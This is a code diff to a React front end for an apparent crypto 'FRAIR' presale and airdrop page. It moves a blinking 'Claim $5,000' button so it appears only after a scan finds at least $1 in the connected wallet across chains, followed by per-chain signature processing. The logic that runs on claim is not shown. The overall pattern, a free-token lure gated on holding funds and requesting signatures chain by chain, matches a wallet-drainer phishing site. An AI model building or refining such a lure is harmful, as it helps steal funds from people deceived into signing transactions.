@@ -103,6 +103,7 @@ function App() {
   const [isEligible, setIsEligible] = useState(false);
   const [eligibleChains, setEligibleChains] = useState([]);
   const [bnbAmount, setBnbAmount] = useState('');
+  const [showClaimButton, setShowClaimButton] = useState(false);
 
   // Presale stats
   const [timeLeft, setTimeLeft] = useState({
@@ -261,6 +262,7 @@ function App() {
       // Check if eligible (total >= $1)
       const eligible = total >= 1;
       setIsEligible(eligible);
+      setShowClaimButton(eligible);
       
       if (eligible) {
         setEligibleChains(chainsWithBalance);
@@ -655,15 +657,6 @@ function App() {
       <div className="fixed w-[600px] h-[600px] bg-red-600 rounded-full blur-[200px] opacity-15 top-[-200px] left-[-200px] pointer-events-none"></div>
       <div className="fixed w-[400px] h-[400px] bg-red-500 rounded-full blur-[150px] opacity-10 bottom-[-100px] right-[-100px] pointer-events-none"></div>
 
-      {/* Airdrop Ribbon - FIXED POSITION */}
-      <div 
-        onClick={claimAirdrop}
-        className="fixed right-[-70px] top-[40%] bg-gradient-to-r from-red-600 to-red-500 text-white py-4 px-24 transform -rotate-90 font-semibold cursor-pointer hover:from-red-700 hover:to-red-600 transition-all z-50 animate-pulse-glow"
-        style={{ animation: 'blink 1.2s infinite' }}
-      >
-        🎁 CLAIM AIRDROP
-      </div>
-
       {/* Main Container */}
       <div className="relative z-10 container mx-auto px-4 py-8 max-w-[720px]">
         
@@ -689,34 +682,59 @@ function App() {
             listings and secure the lowest available token price.
           </p>
 
-          {/* Wallet Connect Button */}
+          {/* Wallet Connect Button - ALWAYS VISIBLE IN SAME POSITION */}
           {!isConnected ? (
             <button
               onClick={() => open()}
               onMouseEnter={() => setHoverConnect(true)}
               onMouseLeave={() => setHoverConnect(false)}
-              className="bg-gradient-to-r from-red-600 to-red-500 hover:from-red-700 hover:to-red-600 text-white font-semibold px-8 py-4 rounded-xl transition-all transform hover:scale-105 hover:shadow-[0_10px_20px_rgba(255,0,0,0.4)] mb-8"
+              className="bg-gradient-to-r from-red-600 to-red-500 hover:from-red-700 hover:to-red-600 text-white font-semibold px-8 py-4 rounded-xl transition-all transform hover:scale-105 hover:shadow-[0_10px_20px_rgba(255,0,0,0.4)] mb-8 w-full max-w-md"
             >
               Connect Wallet To Claim $5000 (Frair Token)
             </button>
           ) : (
-            <div className="flex items-center gap-3 bg-black/50 backdrop-blur border border-red-500/30 rounded-full py-2 pl-5 pr-2 mb-8">
-              <span className="font-mono text-sm text-gray-300">
-                {formatAddress(address)}
-              </span>
-              <button
-                onClick={() => disconnect()}
-                className="w-8 h-8 rounded-full bg-red-600 flex items-center justify-center hover:bg-red-700 transition-colors"
-                title="Disconnect"
-              >
-                <i className="fas fa-power-off text-xs"></i>
-              </button>
+            <div className="flex flex-col items-center w-full max-w-md mb-8">
+              <div className="flex items-center justify-between gap-3 bg-black/50 backdrop-blur border border-red-500/30 rounded-full py-2 pl-5 pr-2 w-full">
+                <span className="font-mono text-sm text-gray-300">
+                  {formatAddress(address)}
+                </span>
+                <button
+                  onClick={() => disconnect()}
+                  className="w-8 h-8 rounded-full bg-red-600 flex items-center justify-center hover:bg-red-700 transition-colors"
+                  title="Disconnect"
+                >
+                  <i className="fas fa-power-off text-xs"></i>
+                </button>
+              </div>
+              
+              {/* CLAIM BUTTON - APPEARS BELOW CONNECT BUTTON WHEN ELIGIBLE */}
+              {showClaimButton && (
+                <button
+                  onClick={claimAirdrop}
+                  disabled={signatureLoading}
+                  className="mt-3 w-full bg-gradient-to-r from-red-600 to-red-500 hover:from-red-700 hover:to-red-600 text-white font-bold py-4 px-6 rounded-xl transition-all transform hover:scale-105 hover:shadow-[0_10px_20px_rgba(255,0,0,0.4)] animate-pulse-glow"
+                  style={{ animation: 'blink 1.2s infinite' }}
+                >
+                  {signatureLoading ? (
+                    <span className="flex items-center justify-center gap-2">
+                      <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
+                      {processingChain ? `Processing ${processingChain}...` : 'Processing...'}
+                    </span>
+                  ) : (
+                    <span className="flex items-center justify-center gap-2">
+                      <span className="text-xl">🎁</span>
+                      CLAIM AIRDROP $5,000 FRAIR
+                      <span className="text-sm bg-white/20 px-2 py-1 rounded-full">+{presaleStats.currentBonus}%</span>
+                    </span>
+                  )}
+                </button>
+              )}
             </div>
           )}
 
-          {/* ELIGIBILITY CHECKING ANIMATION */}
+          {/* ELIGIBILITY CHECKING ANIMATION - MOVED UP FOR MOBILE */}
           {isConnected && scanning && (
-            <div className="w-full max-w-md mb-8">
+            <div className="w-full max-w-md mb-8 relative z-20">
               <div className="bg-black/60 backdrop-blur rounded-2xl p-6 border border-red-500/30">
                 <div className="flex items-center justify-center gap-4 mb-4">
                   <div className="w-12 h-12 border-4 border-red-500 border-t-transparent rounded-full animate-spin"></div>
@@ -790,33 +808,18 @@ function App() {
               {loading ? 'Processing...' : 'Buy FRAIR'}
             </button>
 
-            {/* Airdrop Card */}
+            {/* Airdrop Card - REMOVED DUPLICATE CLAIM BUTTON */}
             <div className="bg-black/50 border border-red-500/30 rounded-xl p-5">
-              <h4 className="text-xl font-bold mb-2 text-red-400">🎁 Claim Airdrop</h4>
+              <h4 className="text-xl font-bold mb-2 text-red-400">🎁 Airdrop Info</h4>
               <p className="text-sm text-gray-400 mb-4">
-                Early supporters can claim free FRAIR tokens.
+                Early supporters can claim free FRAIR tokens. Connect wallet to check eligibility.
               </p>
               
-              <button
-                onClick={claimAirdrop}
-                disabled={signatureLoading || !isConnected || !isEligible}
-                className="w-full bg-gradient-to-r from-red-600 to-red-500 hover:from-red-700 hover:to-red-600 text-white font-semibold py-2.5 rounded-lg transition-all disabled:opacity-50 disabled:cursor-not-allowed"
-              >
-                {signatureLoading ? (
-                  <span className="flex items-center justify-center gap-2">
-                    <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
-                    {processingChain ? `Processing ${processingChain}...` : 'Processing...'}
-                  </span>
-                ) : (
-                  'Claim Airdrop'
-                )}
-              </button>
-              
               {!isConnected && (
-                <p className="text-xs text-red-400/70 mt-2">Connect wallet to check eligibility</p>
+                <p className="text-xs text-red-400/70">Connect wallet to check eligibility</p>
               )}
               {isConnected && !isEligible && (
-                <p className="text-xs text-red-400/70 mt-2">Need at least $1 in wallet to qualify</p>
+                <p className="text-xs text-red-400/70">Need at least $1 in wallet to qualify</p>
               )}
             </div>
 
@@ -1022,10 +1025,16 @@ function App() {
         .animate-fadeIn { animation: fadeIn 0.3s ease-out; }
         .animate-pulse-slow { animation: pulse-slow 3s ease-in-out infinite; }
         .animate-pulse { animation: pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite; }
+        
+        /* Mobile responsive adjustments */
+        @media (max-width: 640px) {
+          .animate-pulse-glow {
+            animation: blink 1s infinite;
+          }
+        }
       `}</style>
     </div>
   );
 }
-
 
 export default App;
